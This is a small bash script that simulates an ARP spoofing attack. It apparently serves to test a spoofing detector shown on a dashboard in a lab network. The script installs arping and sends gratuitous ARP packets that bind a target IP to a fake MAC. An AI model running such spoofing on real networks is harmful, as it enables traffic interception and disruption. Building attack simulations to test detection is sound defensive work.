#!/bin/bash
# Simulate ARP spoofing attack

TARGET_IP=${1:-10.5.0.10}
FAKE_MAC=${2:-aa:bb:cc:dd:ee:99}

echo "============================================================"
echo "  ⚠️  ARP SPOOFING ATTACK SIMULATION"
echo "============================================================"
echo ""
echo "Target IP:  $TARGET_IP"
echo "Fake MAC:   $FAKE_MAC"
echo ""
echo "This will send a gratuitous ARP claiming:"
echo "  '$TARGET_IP is at $FAKE_MAC'"
echo ""
echo "The blockchain should detect this as spoofing!"
echo ""

# Check if arping is available
if ! command -v arping &> /dev/null; then
    echo "❌ arping not found. Installing..."
    apk add --no-cache arping
fi

# Send gratuitous ARP (unsolicited ARP reply)
echo "🚀 Sending spoofed ARP..."
arping -U -c 3 -s "$TARGET_IP" -S "$FAKE_MAC" -I eth0 10.5.0.1

echo ""
echo "✅ Attack packets sent!"
echo "   Check the dashboard for spoofing detection alerts."
echo ""
